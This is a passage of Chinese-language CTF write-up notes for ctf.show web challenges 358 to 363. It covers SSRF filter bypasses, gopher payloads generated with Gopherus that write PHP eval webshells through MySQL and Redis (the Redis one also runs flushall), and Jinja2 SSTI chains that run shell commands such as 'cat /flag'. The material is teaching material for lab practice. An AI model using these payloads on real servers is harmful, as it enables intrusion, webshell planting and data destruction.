url=http://ip/my6n.php
```


### web358

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if(preg_match('/^http:\/\/ctf\..*show$/i',$url)){
    echo file_get_contents($url);
}
```



<details>
<summary>正则表达式 </summary>

`/^http:\/\/ctf\..*show$/i`

- `/`：正则表达式的开始和结束分隔符。
- `^`：匹配字符串的开头。
- `http:\/\/ctf\.`：

- `http:`：匹配字符串 `http:`。
- `\/\/`：匹配 `//`（`/` 是正则表达式的特殊字符，需要用 `\` 转义）。
- `ctf\.`：匹配 `ctf.`（`.` 是正则表达式的特殊字符，需要用 `\` 转义）。

- `.*`：

- `.`：匹配任意单个字符（除了换行符）。
- `*`：匹配前面的字符 0 次或多次。
- `.*`：匹配任意长度的任意字符。

- `show$`：

- `show`：匹配字符串 `show`。
- `$`：匹配字符串的结尾。

- `i`：正则表达式的修饰符，表示不区分大小写。

#### <strong>匹配规则</strong>

- <strong>匹配的 URL 示例</strong>：

- `http://ctf.example.com/show`
- `http://ctf.test/show`
- `http://ctf.abc123show`

- <strong>不匹配的 URL 示例</strong>：

- `https://ctf.example.com/show`（协议不是 `http`）
- `http://ctf.example.com/notshow`（不以 `show` 结尾）
- `http://example.com/show`（不以 `ctf.` 开头）

</details>


源码中要求http://ctf.开头，以show结尾才可以进行读取url。  
采用 @ 截断 payload:


```php
url=http://ctf.@127.0.0.1/flag.php?show

url=http://ctf.:passwd@127.0.0.1/flag.php#show    #改?也可以
```


实际上url=http://ctf.:passwd@127.0.0.1/flag.php#show这段payload中@之前可任意填写字符串

### web359

![](/article-assets/2025/ctfshow-web-notes/images/screenshot-141.webp)

题目中提示打无密码的myslq，那么攻击myslq肯定不能用http协议去攻击，这时候需要用到gopher协议进行对mysql的命令执行，使用工具Gopherus去生成payload，由于数据在提交过程中浏览器会对其进行url解码，为了保证服务器接受到的数据与payload一致，需要对带有百分号部分进行二次编码

使用Gopherus工具方法

::alert{type="info"}
cd Gopherus
::
::alert{type="info"}
python2 gopherus.py --exploit mysql
::
::alert{type="info"}
Give MySQL username: root
::
::alert{type="info"}
Give query to execute: select "`<?php @eval($_POST[bit]);?>`" into outfile "/var/www/html/bit.php"
::
```bash
得到以下
gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%4a%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%62%69%74%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%62%69%74%2e%70%68%70%22%01%00%00%00%01
```


随后对"_"后面内容进行url编码即可


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-142.webp)


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-143.webp)


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-144.webp)
![](/article-assets/2025/ctfshow-web-notes/images/screenshot-145.webp)payload:


```plain
http://a8649415-216a-49c8-8f44-265bc2682d7c.challenge.ctf.show/check.php

u=Username&returl=gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2546%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2540%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2578%255d%2529%253b%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2522%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2531%252e%2570%2568%2570%2522%2501%2500%2500%2500%2501
```


随后访问/bit.php 

POST:密码即为bit 

使用方法即为：访问bit.php页面 post:bit=system("ls /");   即可  


### web360
这里一样的方法，攻击redis数据库，默认生成的文件名为shell.php，将payload中带有百分号的部分进行二次编码然后进行传参即可。  

![](/article-assets/2025/ctfshow-web-notes/images/screenshot-146.webp)  
payload:


```bash
url=gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252429%250D%250A%250A%250A%253C%253Fphp%2520%2540eval%2528%2524_POST%255Bx%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
```



## web入门--SSTI
### web361
经典例子：hello， user_name

代码：


```bash
from flask import Flask,request,render_template_string
app = Flask(__name__)
 
@app.route('/', methods=['GET', 'POST'])
def index():
    name = request.args.get('name')
    template = '''
<html>
  <head>
    <title>SSTI</title>
  </head>
 <body>
      <h3>Hello, %s !</h3>
  </body>
</html>
        '''% (name)
    return render_template_string(template)
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
```


GET输入?name={{``` `` `7*7` `` ```}}
![](/article-assets/2025/ctfshow-web-notes/images/screenshot-147.webp)

说明注入点是?name。


```bash
GET:?name={{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}
```


如何得到payload？

1、先找基类object，用空字符串""来找

::alert{type="info"}
在python中，object类是Python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类。
::
使用?name={{```` ``` `` "".`__class__` `` ``` ````}}，得到空字符串的类<class 'str'>

::alert{type="info"}
点号. ：python中用来访问变量的属性

`__class__`：类的一个内置属性，表示实例对象空字符串""的类。
::
然后使用?name={{```` ``` `` "".`__class__`.`__mro__` `` ``` ````}}，得到(<class 'tuple'>, <class 'object'>)

::alert{type="info"}
`__mro__`              method resolution order，即解析方法调用的顺序；此属性是由类组成的元组，在方法解析期间会基于它来查找基类。
::
然后再用?name={{```` ``` ``().`__class__`.`__mro__`[-1]`` ``` ````}}，取得最后一个东西即空字符串的类的基类<class 'object'>

或者使用?name={{```` ``` `` "".`__class__`.`__bases__` `` ``` ````}}，得到空字符串的类的基类<class 'object'>

::alert{type="info"}
`__base__`             类型对象的直接基类  
`__bases__`           类型对象的全部基类，以元组形式，类型的实例通常没有属性 `__bases__`
::
2、得到基类之后，找到这个基类的子类集合

使用?name={{```` ``` `` ().`__class__`.`__mro__`[1].`__subclasses__()` `` ``` ````}}

::alert{type="info"}
`__subclasses__()`     返回这个类的子类集合，每个类都保留一个对其直接子类的弱引用列表。该方法返回一个列表，其中包含所有仍然存在的引用。列表按照定义顺序排列。
::
3、找到其所有子类集合之后找一个我们能够使用的类，要求是这个类的某个方法能够被我们用于执行、找到flag

这里使用其第133个类（`[0]`是第一个类）<class 'os._wrap_close'>

使用?name={{```` ``` ``"".`__class__`.`__mro__`[-1].`__subclasses__()`[132]`` ``` ````}}，得到<class 'os._wrap_close'>

::alert{type="info"}
<class 'os._wrap_close'>        这个类有个popen方法可以执行系统命令
::
4、实例化我们找到的类对象

使用?name={{```` ``` `` "".`__class__`.`__mro__`[-1].`__subclasses__()`[132].`__init__` `` ``` ````}}，实例化这个类

::alert{type="info"}
`__init__`             初始化类，返回的类型是function
::
5、找到这个实例化对象的所有方法

使用?name={{```` ``` `` "".`__class__`.`__mro__`[-1].`__subclasses__()`[132].`__init__`.`__globals__` `` ``` ````}}

::alert{type="info"}
`__globals__`          使用方式是 function.`__globals__获取function所处空间下可使用的module`、方法以及所有变量。
::
6、根据方法寻找flag

::alert{type="info"}
?name={{```` ``` ``().`__class__`.`__mro__`[-1].`__subclasses__()`[132].`__init__`.`__globals__`['popen']('cat /flag').read()`` ``` ````}}
::
> popen()一个方法，用于执行命令
>
> read() 从文件当前位置起读取size个字节，若无参数size，则表示读取至文件结束为止，它范围为字符串对象
>

### web362
过滤了一些字符：2、3等 

payload:


```bash
GET:?name={{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")}}
 
或者
?name={{url_for.__globals__.__builtins__.eval("__import__('os').popen('cat /flag').read()")}}
 
得到__builtin__的另一个方法
?name={{x.__init__.__globals__['__builtins__']}}
 
//这里的x任意26个英文字母的任意组合都可以，同样可以得到__builtins__然后用eval就可以了。
 
或者用模版来跑循环
?name={% for i in ''.__class__.__mro__[1].__subclasses__() %}{% if i.__name__=='_wrap_close' %}{% print i.__init__.__globals__['popen']('ls').read() %}{% endif %}{% endfor %}
```


> python2和python3两个版本通用的方法
>
> `__builtins__代码执行`
>
> `__builtins__` 内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。`__builtins__与__builtin__的区别`
>
> 在启动Python解释器后，就可以直接使用一些函数.
>
> 这些函数称为内建函数，在`__builtins__模块中`，Python在启动时就直接为我们导入了。准确的说，Python在启动时会首先加载内建名称空间，内建名称空间中有许多名字到对象之间的映射，这些名字就是内建函数的名称，对象就是这些内建函数对象。可以使用dir(builtins)来查看调用方法的列表，然后可以发现`__builtins__下有eval`，`__import__等的函数`，因此可以利用此来执行命令。
>
> 除了标准的python语法使用点（.）外，还可以使用中括号（`[]`）来访问变量的属性
>
> 比如
>


```bash
{{"".__class__}}
{{""['__classs__']}}
```


### web363
过滤了单双引号，可以用request来绕过

payload


```bash
GET：?name={{x.__init__.__globals__[request.args.x1].eval(request.args.x2)}}&x1=__builtins__&x2=__import__('os').popen('cat /flag').read()
 
相当于
?name={{x.__init__.__globals__['__builtins__'].eval('__import__('os').popen('cat /flag').read()')}}
把在引号里面的东西逃逸出去
```
